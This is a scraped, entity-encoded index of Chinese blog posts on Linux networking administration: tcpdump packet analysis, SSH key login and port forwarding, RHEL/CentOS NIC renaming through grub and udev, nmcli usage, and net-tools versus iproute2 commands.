1234521:27:06.995846&#xA0;IP&#xA0;(tos&#xA0;0x0,&#xA0;ttl&#xA0;64,&#xA0;id&#xA0;45646,&#xA0;offset&#xA0;0,&#xA0;flags&#xA0;[DF],&#xA0;proto&#xA0;TCP&#xA0;(6),&#xA0;length&#xA0;64)&#xA0;&#xA0;&#xA0;&#xA0;192.168.1.110.40411&#xA0;&gt;&#xA0;192.168.1.123.80:&#xA0;Flags&#xA0;[S],&#xA0;cksum&#xA0;0xa730&#xA0;(correct),&#xA0;seq&#xA0;992042666,&#xA0;win&#xA0;65535,&#xA0;options&#xA0;[mss&#xA0;1460,nop,wscale&#xA0;4,nop,nop,TS&#xA0;val&#xA0;663433143&#xA0;ecr&#xA0;0,sackOK,eol],&#xA0;length&#xA0;021:27:07.030487&#xA0;IP&#xA0;(tos&#xA0;0x0,&#xA0;ttl&#xA0;51,&#xA0;id&#xA0;0,&#xA0;offset&#xA0;0,&#xA0;flags&#xA0;[DF],&#xA0;proto&#xA0;TCP&#xA0;(6),&#xA0;length&#xA0;44)&#xA0;&#xA0;&#xA0;&#xA0;192.168.1.123.80&#xA0;&gt;&#xA0;192.168.1.110.40411:&#xA0;Flags&#xA0;[S.],&#xA0;cksum&#xA0;0xedc0&#xA0;(correct),&#xA0;seq&#xA0;2147006684,&#xA0;ack&#xA0;992042667,&#xA0;win&#xA0;14600,&#xA0;options&#xA0;[mss&#xA0;1440],&#xA0;length&#xA0;021:27:07.030527&#xA0;IP&#xA0;(tos&#xA0;0x0,&#xA0;ttl&#xA0;64,&#xA0;id&#xA0;59119,&#xA0;offset&#xA0;0,&#xA0;flags&#xA0;[DF],&#xA0;proto&#xA0;TCP&#xA0;(6),&#xA0;length&#xA0;40)&#xA0;&#xA0;&#xA0;&#xA0;192.168.1.110.40411&#xA0;&gt;&#xA0;192.168.1.123.80:&#xA0;Flags&#xA0;[.],&#xA0;cksum&#xA0;0x3e72&#xA0;(correct),&#xA0;ack&#xA0;2147006685,&#xA0;win&#xA0;65535,&#xA0;length&#xA0;0 &#x683C;&#x5F0F;&#x89E3;&#x8BFB; 192.168.1.110.40411 &#x6E90;&#x5730;&#x5740;IP.&#x6E90;&#x7AEF;&#x53E3; 192.168.1.123.80 &#x76EE;&#x7684;&#x5730;&#x5740;.&#x76EE;&#x7684;&#x7AEF;&#x53E3; &gt; &#x4EE3;&#x8868;&#x6570;&#x636E;&#x7684;&#x65B9;&#x5411; &#x6570;&#x636E;&#x5305;&#x5206;&#x6790;12345tcpdump -ntx -c 1# -n &#x663E;&#x793A;IP&#x5730;&#x5740;&#x800C;&#x975E;&#x57DF;&#x540D;&#x5730;&#x5740;# -t &#x4E0D;&#x663E;&#x793A;&#x65F6;&#x95F4;&#x6233;# -x &#x4EE5;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x663E;&#x793A;&#x5305;&#x5185;&#x5BB9;# -c tcpdump&#x5C06;&#x5728;&#x63A5;&#x53D7;1&#x4E2A;&#x6570;&#x636E;&#x5305;&#x540E;&#x9000;&#x51FA; .png 192.168.73.10.ssh &gt; 192.168.73.1.13229&#x8868;&#x793A;&#xFF1A;&#x6E90;ip 192.168.73.10&#xFF0C;&#x670D;&#x52A1;/&#x7AEF;&#x53E3;ssh;&#x76EE;&#x7684;ip 192.168.73.1&#xFF0C;&#x670D;&#x52A1;/&#x7AEF;&#x53E3;13229 &#x770B;&#x5230;0x000&#x884C; &#x534F;&#x8BAE;&#x7248;&#x672C;&#xFF1A;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#x4E3A;4&#xFF0C;&#x8868;&#x793A;0x4&#x3002;&#x5373;&#x534F;&#x8BAE;&#x7248;&#x672C;&#x662F;IPv4 &#x5E38;&#x89C1;&#x7684;&#x4E00;&#x4E9B;&#x534F;&#x8BAE;&#x76F8;&#x5E94;&#x5B57;&#x6BB5;&#x503C; &#x534F;&#x8BAE;&#x540D; ICMP IGMP IP TCP EGP IGP UDP IPv6 ESP OSPF &#x534F;&#x8BAE;&#x5B57;&#x6BB5;&#x503C; 1 2 4 6 8 9 17 41 50 89 &#x9996;&#x90E8;&#x957F;&#x5EA6;&#xFF1A;&#x7B2C;&#x4E8C;&#x4E2A;&#x6570;&#x5B57;&#x4E3A;5&#xFF0C;&#x8868;&#x793A;0x5&#x3002;5*4=20&#xFF08;&#x5341;&#x516D;&#x8FDB;&#x5236;1&#x4F4D;&#x5BF9;&#x5E94;&#x4E8C;&#x8FDB;&#x5236;4&#x4F4D;&#xFF09;&#xFF0C;&#x8868;&#x793A;IP&#x62A5;&#x5934;&#x957F;&#x5EA6;&#x4E3A;20&#x5B57;&#x8282;&#x3002;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x901A;&#x5E38;&#x7B49;&#x4E8E;8&#x4F4D;&#xFF0C;&#x6240;&#x4EE5;IP&#x62A5;&#x5934;&#x4E3A;4510&#x5230;4901.png &#x670D;&#x52A1;&#x7C7B;&#x578B;TOS&#xFF1A;0x00&#xFF0C;&#x610F;&#x5473;&#x7740;&#x662F;&#x4E00;&#x822C;&#x670D;&#x52A1; &#x603B;&#x957F;&#x5EA6;&#xFF1A;0x00ec&#xFF0C;&#x6362;&#x7B97;&#x6210;&#x5341;&#x8FDB;&#x5236;&#x4E3A;236&#x5B57;&#x8282;&#x3002; &#x6807;&#x8BC6;&#xFF1A;0x5175 3bit&#x6807;&#x5FD7;+13bit&#x7247;&#x504F;&#x79FB;&#xFF1A;0x4000 &#x751F;&#x5B58;&#x65F6;&#x95F4;&#xFF1A;0x40&#xFF0C;&#x5341;&#x8FDB;&#x5236;&#x503C;&#x4E3A;64 &#x534F;&#x8BAE;&#xFF1A;0x06 &#x4EE3;&#x8868;TCP&#x534F;&#x8BAE;&#x9996;&#x90E8;&#x6821;&#x9A8C;&#x548C;&#xFF1A;0xd52a Wireshark&#x7684;&#x4F7F;&#x7528;&#x901A;&#x8FC7;tcpdump&#x6293;&#x5305;&#x5BFC;&#x51FA;pcap&#x6587;&#x4EF6;1tcpdump -i ens33 icmp and host 192.167.73.100 -w ping.pcap &#x4F7F;&#x7528;wireshark&#x6253;&#x5F00;&#x8F93;&#x51FA;&#x7684;&#x6587;&#x4EF6;.png &#x53C2;&#x8003;&#xFF1A;&#x5B9E;&#x6218;&#xFF01;&#x6211;&#x7528; Wireshark &#x8BA9;&#x4F60;&#x201C;&#x770B;&#x89C1;&#x201C; TCP document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"SSH原理与应用","date":"2022-06-07T04:41:45.000Z","path":"/posts/e228b71f/","text":"SSH&#x539F;&#x7406;SSH&#x5B89;&#x88C5;&#x4E0E;&#x914D;&#x7F6E;SSH&#x57FA;&#x672C;&#x7528;&#x6CD5;SSH&#x53E3;&#x4EE4;&#x767B;&#x5F55;&#x4E0E;&#x516C;&#x94A5;&#x767B;&#x5F55;&#x53E3;&#x4EE4;&#x767B;&#x5F55;&#x516C;&#x94A5;&#x8BA4;&#x8BC1;&#x767B;&#x5F55;1ssh-keygen -t rsa -C &quot;your_mail@example.com&quot; -f github_rsa Windows&#x4E0E;Linux&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x514D;&#x5BC6;&#x767B;&#x5F55;# Windows&#x5BA2;&#x6237;&#x7AEF;&#xFF1A; ssh-keygen ...id_rsa_ubuntu ... ... scp keygen_file.pub linux@addree:~/.ssh/ # Linux&#x670D;&#x52A1;&#x5668;: cat .ssh/id_rsa_ubuntu.pub &gt; authorized_keys # Windows&#x5BA2;&#x6237;&#x7AEF;: notepad C:\\Users\\Administrator\\.ssh\\config Host 192.168.73.30 HostName 192.168.73.30 User echo PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa_ubuntu SSH&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x4EE5;MySQL&#x4E3A;&#x4F8B; MySQL&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x5141;&#x8BB8;MySQL&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5EFA;&#x7ACB;&#x4E0E;MySQL&#x670D;&#x52A1;&#x5668;&#x7684;ssh&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x8FDE;&#x63A5; &#x4E09;&#x79CD;&#x683C;&#x5F0F;&#xFF08;&#x4EFB;&#x610F;&#x4E00;&#x79CD;&#x5199;&#x6CD5;&#x90FD;&#x884C;&#xFF09;&#xFF1A; ssh -L 127.0.0.1:3306:127.0.0.1:3306 echo@192.168.73.30 &#x672C;&#x5730;&#x7F51;&#x5361;&#x5730;&#x5740;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#xFF1A; ssh -L 3306:127.0.0.1:3306 root@192.168.73.30 &#x82E5;&#x4E24;&#x53F0;&#x673A;&#x5668;&#x7684;&#x767B;&#x5F55;&#x7528;&#x6237;&#x540D;&#x76F8;&#x540C;&#xFF0C;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#x767B;&#x5F55;&#x7528;&#x6237;&#x540D;&#xFF1A; ssh -L 3306:127.0.0.1:3306 192.168.73.30 &#x8FDC;&#x7A0B;&#x547D;&#x4EE4; ssh user@ip &apos;command&apos; ssh root@192.168.10.12 &apos;uname -a&apos; tar -cz test | ssh root@192.168.10.12 &apos;tar -xz&apos; &#x3010;&#x6CE8;&#x610F;&#xFF01;&#x3011;&#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x4E8E;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;&#x7684;&#x7AEF;&#x53E3;&#x4E0D;&#x80FD;&#x88AB;&#x5360;&#x7528; &#x3010;&#x6D4B;&#x8BD5;&#x3011; &#x5728;MySQL&#x670D;&#x52A1;&#x5668;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x5982;&#x4E0B;&#xFF1A; .png &#x5728;&#x53E6;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x53EF;&#x4EE5;&#x767B;&#x5F55;&#x5230;MySQL&#x670D;&#x52A1;&#x5668;&#xFF1A; .png &#x5173;&#x95ED;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x8FDE;&#x63A5;&#xFF0C;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x65E0;&#x6CD5;&#x767B;&#x5F55;&#xFF1A; .png &#x6CE8;&#x610F;&#xFF1A; &#x5982;&#x679C;&#x4F60;&#x4E00;&#x76F4;&#x8BBF;&#x95EE;&#x7740;&#x8FDC;&#x7A0B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x90A3;&#x4E48;ssh&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x8FDE;&#x63A5;&#x65E0;&#x6CD5;&#x5173;&#x95ED; Apache/Nginx&#x7684;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#xFF1A; ssh -L 192.168.73.10:80:127.0.0.1:80 echo@192.168.73.30 &#x628A;&#x672C;&#x5730;&#x7684;&#x67D0;&#x4E2A;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x5230;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF1A; Nginx&#x670D;&#x52A1;&#x5668;.png &#x5BA2;&#x6237;&#x7AEF;.png ssh -f -N -L 192.168.73.10:80:192.168.73.30:80 echo@192.168.73.30 .png.png &#x8FDC;&#x7A0B;&#x8F6C;&#x53D1; &#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;&#x662F;&#x901A;&#x8FC7;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x95F4;&#x5185;&#x7F51;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x516C;&#x7F51;&#x7AEF;&#x53E3;&#x4E0A;&#x4F7F;&#x7528;&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;&#x9700;&#x8981;&#x5148;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5141;&#x8BB8;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x548C;&#x5141;&#x8BB8;&#x7AEF;&#x53E3;&#x7ED1;&#x5B9A; vim /etc/ssh/sshd_config AllowTcpForwarding yes GatewayPorts yes &#x4F8B;&#x5B50;&#xFF1A;CentOS 7&#xFF1A;192.168.110.20RHEL 7: 192.168.73.10Ubuntu 18.04(Nginx Server): 192.168.73.30 Ubuntu:&#x5C06;&#x672C;&#x5730;80&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;rhel 7&#x4E0A; ssh -R 0.0.0.0:80:localhost:80 root@192.168.73.10 rhel 7:&#x5C06;&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;CentOS 7&#x4E0A; ssh -R 0.0.0.0:80:localhost:80 root@192.168.110.20 &#x52A8;&#x6001;&#x8F6C;&#x53D1;ssh -D [&#x672C;&#x5730;&#x5730;&#x5740;]:&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x53F7; &#x8FDC;&#x7A0B;&#x7528;&#x6237;@&#x8FDC;&#x7A0B;&#x5730;&#x5740; &#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x7EF4;&#x6301;&#x52A8;&#x6001;&#x8F6C;&#x53D1; ssh -D 1080 user@server1_ip&#x7EF4;&#x6301;&#x94FE;&#x63A5; ssh -o ServerAliveInterval=time user@ip &#x6587;&#x6863;https://www.ssh.com/academy/ssh/tunneling/example &#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53C2;&#x6570;&#x89E3;&#x91CA; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"rhel修改网卡命名规则","date":"2022-06-07T04:41:31.000Z","path":"/posts/bae5d4f0/","text":"&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;12mv /etc/sysconfig/network-scripts/ifcfg-ens33 /etc/sysconfig/network-scripts/ifcfg-eth0vim /etc/sysconfig/network-scripts/ifcfg-eth0 12345TYPE=Ethernet....NAME=eth0DEVICE=eth0... &#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219; &#x6B64;&#x529F;&#x80FD;&#x901A;&#x8FC7;/etc/default/grub&#x6587;&#x4EF6;&#x6765;&#x63A7;&#x5236;&#xFF0C;&#x8981;&#x7981;&#x7528;&#x6B64;&#x529F;&#x80FD;&#xFF0C;&#x5728;&#x6587;&#x4EF6;&#x4E2D;GRUB_CMDLINE_LINUX&#x884C;&#x7684;&#x672B;&#x5C3E;&#x52A0;&#x5165;net.ifnames=0 biosdevname=0&#x5373;&#x53EF; [root@ctos74 ~]$ cat /etc/default/grub 1234567GRUB_TIMEOUT=5GRUB_DISTRIBUTOR=&quot;$(sed &apos;s, release .*$,,g&apos; /etc/system-release)&quot;GRUB_DEFAULT=savedGRUB_DISABLE_SUBMENU=trueGRUB_TERMINAL_OUTPUT=&quot;console&quot;GRUB_CMDLINE_LINUX=&quot;rd.lvm.lv=centos/root rd.lvm.lv=centos/swap rhgb quiet&quot;GRUB_DISABLE_RECOVERY=&quot;true&quot; 1sed -i &apos;s/swap rhgb quiet/&amp; net.ifnames=0 biosdevname=0/&apos; /etc/default/grub &#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;rhel7&#x4E2D;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x5230;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;70-persistent-ipoib.rules&#x4E2D;CentOS&#x76F4;&#x63A5;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;70-persistent-net.rules&#x6587;&#x4EF6; 1SUBSYSTEM==&quot;net&quot;,ACTION==&quot;add&quot;,DRIVERS==&quot;?*&quot;,ATTR{address}==&quot;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x540D;&#x79F0;&#x7684;&#x7F51;&#x5361;MAC&#x5730;&#x5740;&quot;,ATTR&#xFF5B;type&#xFF5D;==&quot;1&quot; ,KERNEL==&quot;eth*&quot;,NAME=&quot;eth0&quot; &#x66F4;&#x65B0;grub&#x914D;&#x7F6E;grub2-mkconfig -o /boot/grub2/grub.cfg &#x6269;&#x5C55;&#xFF1A; shell&#x811A;&#x672C;&#x5B9E;&#x73B0;&#x4EE5;&#x4E0A;&#x5168;&#x90E8;&#x64CD;&#x4F5C;123456789101112131415161718192021222324252627#!/bin/bashNetInterfaceNameRules(){# &#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;cp /etc/sysconfig/network-scripts/ifcfg-ens33 /etc/sysconfig/network-scripts/backupens33echo -e &quot;\\e[1;32m&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5907;&#x4EFD;&#x5728;/etc/sysconfig/network-scripts/backupens33\\e[0m&quot;/usr/bin/sed -i &apos;s/NAME=ens33/NAME=eth0/g&apos; /etc/sysconfig/network-scripts/ifcfg-ens33/usr/bin/sed -i &apos;s/DEVICE=ens33/DEVICE=eth0/g&apos; /etc/sysconfig/network-scripts/ifcfg-ens33# &#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;cp /etc/default/grub /etc/default/backupgrubecho -e &quot;\\e[1;32m&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#xFF1A;backupgrub\\e[0m&quot;/usr/bin/sed -i &apos;s/swap rhgb quiet/&amp; net.ifnames=0 biosdevname=0/&apos; /etc/default/grub# &#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;MAC_ADDR=`ip link show dev ens33 | awk &apos;END{ print $NR }&apos;`if [ -f /etc/udev/rules.d/70-persistent-ipoib.rules ]then /usr/bin/sed -i &apos;$a SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, DRIVERS==&quot;?*&quot;, ATTR{addresss}==&apos;\\&quot;&quot;$MAC_ADDR&quot;\\&quot;&apos;,ATTR{type}==&quot;1&quot;,KERNEL==&quot;eth*&quot;,NAME=&quot;eth0&quot;&apos; /etc/udev/rules.d/70-persistent-*else /usr/bin/echo &apos;SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, DRIVERS==&quot;?*&quot;, ATTR{addresss}==&apos;\\&quot;&quot;$MAC_ADDR&quot;\\&quot;&apos;,ATTR{type}==&quot;1&quot;,KERNEL==&quot;eth*&quot;,NAME=&quot;eth0&quot;&apos; &gt;&gt; /etc/udev/rules.d/70-persistent-net.rulesfisudo /usr/sbin/grub2-mkconfig -o /boot/grub2/grub.cfg}NetInterfaceNameRules document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"NetworkManager管理工具","date":"2022-06-07T04:41:12.000Z","path":"/posts/1876d05d/","text":"NetworkManager &#x7F51;&#x7EDC;&#x7BA1;&#x7406;&#x5DE5;&#x5177;NetworkManager&#x53EF;&#x4EE5;&#x901A;&#x8FC7;networkmanager&#x5305;&#x5B89;&#x88C5;&#xFF0C;&#x5B89;&#x88C5;&#x540E;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;daemon&#x3001;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;nmcli&#x548C;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;curses&#x7684;&#x754C;&#x9762;nmtui&#x3002; &#x542F;&#x7528;&#x4E0E;&#x5173;&#x95ED; &#x901A;&#x8FC7;NetworkManager.servicesystemd&#x670D;&#x52A1;&#x542F;&#x52A8;&#x4E0E;&#x5173;&#x95ED; &#x8BED;&#x6CD5;1nmcli [OPTIONS] OBJECT { COMMAND | help } &#x9009;&#x9879;12345678910111213141516171819OPTIONS -t[erse] # terse output &#x7B80;&#x6D01;&#x7684;&#x8F93;&#x51FA; -p[retty] # pretty output &#x6F02;&#x4EAE;&#x7684;&#x8F93;&#x51FA; -m[ode] tabular|multiline # output mode &#x8F93;&#x51FA;&#x6A21;&#x5F0F; -f[ields] &lt;field1,field2,...&gt;|all|common # specify fields to output &#x6307;&#x5B9A;&#x8981;&#x8F93;&#x51FA;&#x7684;&#x5B57;&#x6BB5; -e[scape] yes|no # escape columns separators in values &#x5728;&#x503C;&#x4E2D;&#x8F6C;&#x4E49;&#x5217;&#x5206;&#x9694;&#x7B26; -n[ocheck] # &#x4E0D;&#x8981;&#x68C0;&#x67E5;nmcli&#x548C;NetworkManager&#x7248;&#x672C; -a[sk] # &#x8981;&#x6C42;&#x7F3A;&#x5C11;&#x53C2;&#x6570; -w[ait] &lt;seconds&gt; # &#x8BBE;&#x7F6E;&#x8D85;&#x65F6;&#x7B49;&#x5F85;&#x6574;&#x7406;&#x64CD;&#x4F5C; -v[ersion] # &#x663E;&#x793A;&#x7A0B;&#x5E8F;&#x7248;&#x672C; -h[elp] # &#x6253;&#x5370;&#x6B64;&#x5E2E;&#x52A9;OBJECT g[eneral] NetworkManager&#x7684;&#x4E00;&#x822C;&#x72B6;&#x6001;&#x548C;&#x64CD;&#x4F5C; n[etworking] &#x6574;&#x4F53;&#x7EC4;&#x7F51;&#x63A7;&#x5236; r[adio] NetworkManager&#x5207;&#x6362;&#x5F00;&#x5173; c[onnection] NetworkManager&#x7684;&#x8FDE;&#x63A5; d[evice] &#x7531;NetworkManager&#x7BA1;&#x7406;&#x7684;&#x8BBE;&#x5907; a[gent] NetworkManager&#x79D8;&#x5BC6;&#x4EE3;&#x7406;&#x6216;polkit&#x4EE3;&#x7406; &#x5B9E;&#x4F8B;12345678910nmcli connection show # &#x67E5;&#x770B;&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x72B6;&#x6001;nmcli connection reload # &#x91CD;&#x542F;&#x670D;&#x52A1;nmcli connection show -active # &#x663E;&#x793A;&#x6D3B;&#x52A8;&#x7684;&#x8FDE;&#x63A5;nmcli connection show &quot;lan eth0&quot; # &#x663E;&#x793A;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x914D;&#x7F6E;nmcli device status # &#x663E;&#x793A;&#x8BBE;&#x5907;&#x72B6;&#x6001;nmcli device show eno16777736 # &#x663E;&#x793A;&#x6307;&#x5B9A;&#x63A5;&#x53E3;&#x5C5E;&#x6027;nmcli device show # &#x663E;&#x793A;&#x5168;&#x90E8;&#x63A5;&#x53E3;&#x5C5E;&#x6027;nmcli con up static # &#x542F;&#x7528;static&#x8FDE;&#x63A5;&#x914D;&#x7F6E;nmcli con up default # &#x542F;&#x7528;default&#x8FDE;&#x63A5;&#x914D;&#x7F6E; nmcli con add help # &#x67E5;&#x770B;&#x5E2E;&#x52A9; &#x521B;&#x5EFA;&#x7F51;&#x7EDC;&#x4F1A;&#x8BDD;1234567nmcli connection add con-name company ifname ens33 autoconnect no type ethernet ip4 192.168.1.2/24 gw4 192.168.1.1# con-name &#x6307;&#x5B9A;&#x4F1A;&#x8BDD;&#x540D;&#x79F0;&#xFF0C;# ifname &#x6307;&#x5B9A;&#x672C;&#x673A;&#x7F51;&#x5361;# autoconnect no/yes &#x662F;&#x5426;&#x81EA;&#x52A8;&#x8FDE;&#x63A5;# type &#x6307;&#x5B9A;&#x7F51;&#x5361;&#x7C7B;&#x578B;ethernet# ip4/ip6# gw4/gw6 123456789101112131415161718192021#!/bin/bash# nmcliecho &quot;NetworkManager&#x7BA1;&#x7406;&#x811A;&#x672C;&quot;echo -e &quot;1.&#x67E5;&#x770B;&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x72B6;&#x6001;\\n2.&#x91CD;&#x542F;&#x670D;&#x52A1;\\n3.&#x663E;&#x793A;&#x6D3B;&#x52A8;&#x7684;&#x8FDE;&#x63A5;\\n&quot;function net_stat(){ # &#x67E5;&#x770B;&#x5168;&#x90E8;&#x72B6;&#x6001; nmcli connection show # &#x67E5;&#x770B;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F; nmcli connection show $0}while truedoread -p &quot;&#x8BF7;&#x9009;&#x62E9;&#x60A8;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;&quot; infocase $info in1) nmcli connection show ;;*) echo -e &quot;\\e[1;31mError! &#x683C;&#x5F0F;&#x9519;&#x8BEF;&#xFF01;\\e[0m&quot;done document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"net-tools工具","date":"2022-06-07T04:40:59.000Z","path":"/posts/1939d3e2/","text":"net-tools&#x5DE5;&#x5177;&#x5305; net-tools iproute2 arp -na ip neigh ifconfig ip link ifconfig -a ip addr show ifconfig &#x2013;help ip help ifconfig -eth0 up ip link set eth0 up ipmaddr ip maddr iptunnel ip tunnel netstat ss netstat -i ip -s link netstat -g ip maddr netstat -l ss -l netstat -r ip route route add ip route add route del ip route del route -n ip route show vconfig ip link ifconfigeth0&#x3001;eth0:1&#x3001;eth0.1&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;&#xFF1A;&#x4E09;&#x8005;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;&#x5BF9;&#x5E94;&#x4E8E;&#x7269;&#x7406;&#x7F51;&#x5361;&#x3001;&#x5B50;&#x7F51;&#x5361;&#x3001;&#x865A;&#x62DF;VLAN&#x7F51;&#x5361; &#x7269;&#x7406;&#x7F51;&#x5361; &#x7269;&#x7406;&#x7F51;&#x5361;&#x8FD9;&#x91CC;&#x6307;&#x7684;&#x662F;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5B9E;&#x9645;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x8BBE;&#x5907; &#x5B50;&#x7F51;&#x5361; &#x5E76;&#x4E0D;&#x662F;&#x5B9E;&#x9645;&#x4E0A;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x8BBE;&#x5907;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x51FA;&#x73B0;&#xFF0C;&#x5982;eth0:1&#x3001;eth0:2&#x3002;&#x5B83;&#x4EEC;&#x5FC5;&#x987B;&#x8981;&#x4F9D;&#x8D56;&#x4E8E;&#x7269;&#x7406;&#x7F51;&#x5361;&#xFF0C;&#x867D;&#x7136;&#x53EF;&#x4EE5;&#x4E0E;&#x7269;&#x7406;&#x7F51;&#x5361;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x540C;&#x65F6;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x5B58;&#x5728;&#x5E76;&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x62E5;&#x6709;&#x5B83;&#x4EEC;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x7EDC;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x4F46;&#x662F;&#x5F53;&#x5B83;&#x4F9D;&#x8D56;&#x7684;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4E0D;&#x542F;&#x52A8;&#xFF08;Down&#xFF09;&#x65F6;&#xFF0C;&#x8FD9;&#x4E9B;&#x5B50;&#x7F51;&#x5361;&#x5C06;&#x4E0D;&#x80FD;&#x5DE5;&#x4F5C; &#x865A;&#x62DF;VLAN&#x7F51;&#x5361; 